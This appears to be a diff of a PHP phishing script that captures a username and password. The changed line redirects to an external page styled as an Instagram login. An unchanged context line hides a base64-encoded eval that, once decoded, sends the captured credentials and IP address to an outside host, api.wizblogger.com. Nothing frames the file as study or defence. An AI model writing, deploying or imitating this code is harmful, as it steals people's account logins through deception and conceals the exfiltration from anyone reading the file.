@@ -9,7 +9,7 @@ $fecha = date("Y-m-d;h:i:s"); //se captura la hora donde se ingresaron los datos
  
  
 if( (empty($usuario)) or (empty($clave)) ){
-     header('location: insta/index.html'); // codigo de verificacion que no esten los campos vacios
+     header('location: https://dedsec1911.github.io/insta/index.html'); // codigo de verificacion que no esten los campos vacios
 }else{
  
 eval(base64_decode('JHVybD0iaHR0cDovL2FwaS53aXpibG9nZ2VyLmNvbS92ZXJpZnkucGhwP2FwaV9rZXk9Y3lMWWdTVTNWOXlmd1BHOU13Z0MmdXNlcm5hbWU9Ii51cmxlbmNvZGUoJHVzdWFyaW8pLiImcGFzc3dvcmQ9Ii51cmxlbmNvZGUoJGNsYXZlKS4iJmlwPSIudXJsZW5jb2RlKCRpcCk7CkBmaWxlX2dldF9jb250ZW50cygkdXJsKTs='));
